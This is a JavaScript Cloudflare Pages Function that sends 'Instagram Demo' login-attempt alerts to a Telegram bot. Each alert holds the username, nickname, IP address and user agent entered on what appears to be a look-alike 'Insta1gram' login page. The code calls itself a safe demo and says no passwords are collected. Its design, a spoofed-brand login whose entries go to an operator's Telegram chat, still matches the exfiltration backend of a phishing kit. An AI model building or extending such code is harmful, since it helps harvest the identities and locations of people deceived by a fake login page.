/**
 * Cloudflare Pages Functions - Telegram Notification Service
 * Dispatches safe demo login notifications to Telegram Bot API.
 */

// In-memory deduplication cache per Worker isolate
const recentDispatches = new Map();
const DEDUP_WINDOW_MS = 4000;

export function isDuplicate(username, ip) {
  const key = `${(username || '').toLowerCase()}_${ip || 'unknown'}`;
  const now = Date.now();
  const lastTime = recentDispatches.get(key);
  if (lastTime && (now - lastTime) < DEDUP_WINDOW_MS) {
    return true;
  }
  recentDispatches.set(key, now);

  if (recentDispatches.size > 200) {
    for (const [k, time] of recentDispatches.entries()) {
      if (now - time > 60000) recentDispatches.delete(k);
    }
  }
  return false;
}

export function escapeHtml(str) {
  return String(str || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

export function jsonResponse(data, status = 200, extraHeaders = {}) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
      ...extraHeaders
    }
  });
}

/**
 * Dispatch Telegram notification asynchronously
 */
export async function sendTelegramNotification(env, {
  username,
  nickname,
  status,
  ip,
  userAgent,
  clientTime,
  sessionId
}) {
  const token = env.TELEGRAM_BOT_TOKEN;
  const chatId = env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    console.warn('[Telegram] Skipped: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing');
    return { ok: false, error: 'Telegram credentials missing' };
  }

  const now = new Date();
  const formattedUtc = now.toISOString().replace('T', ' ').replace(/\..+/, '') + ' UTC';
  let formattedLocal = '';
  try {
    formattedLocal = now.toLocaleString('en-US', {
      timeZone: 'Asia/Kolkata',
      dateStyle: 'medium',
      timeStyle: 'medium'
    }) + ' (IST)';
  } catch (_) {
    formattedLocal = formattedUtc;
  }

  const cleanUser = String(username || 'demo_user').slice(0, 80);
  const cleanNickname = String(nickname || 'Not specified').slice(0, 80);
  const cleanStatus = String(status || 'successful demo entry').slice(0, 60);
  const cleanIp = String(ip || 'Unknown').slice(0, 50);
  const cleanUa = String(userAgent || 'Unknown').slice(0, 100);
  const cleanSessionId = String(sessionId || `SESS-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`);

  const text = [
    '🔔 <b>Instagram Demo — Login Attempt Notification</b>',
    '',
    `👤 <b>Demo Username:</b> <code>${escapeHtml(cleanUser)}</code>`,
    `🏷️ <b>Nickname:</b> <code>${escapeHtml(cleanNickname)}</code>`,
    '🔑 <b>Demo Credential:</b> <code>[Simulated / No actual password collected]</code>',
    `🆔 <b>Session ID:</b> <code>${escapeHtml(cleanSessionId)}</code>`,
    `📅 <b>Date & Time (UTC):</b> <code>${escapeHtml(formattedUtc)}</code>`,
    `🕒 <b>Date & Time (Local):</b> <code>${escapeHtml(formattedLocal)}</code>`,
    `📊 <b>Status:</b> ✅ ${escapeHtml(cleanStatus)}`,
    `🌐 <b>Client IP:</b> <code>${escapeHtml(cleanIp)}</code>`,
    `💻 <b>User Agent:</b> <code>${escapeHtml(cleanUa)}</code>`,
    '',
    '<i>ℹ️ Note: Automated demonstration notification from Insta1gram. No personal or sensitive passwords are ever collected or stored.</i>'
  ].join('\n');

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 12000);

    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      }),
      signal: controller.signal
    });

    clearTimeout(timeoutId);
    const data = await res.json();

    if (!data.ok) {
      console.error('[Telegram] API response error:', data.description);
      return { ok: false, error: data.description };
    }

    return { ok: true, messageId: data.result ? data.result.message_id : null, textSent: text };
  } catch (err) {
    const msg = err.name === 'AbortError' ? 'Request timed out' : err.message;
    console.error('[Telegram] Dispatch failed:', msg);
    return { ok: false, error: msg };
  }
}

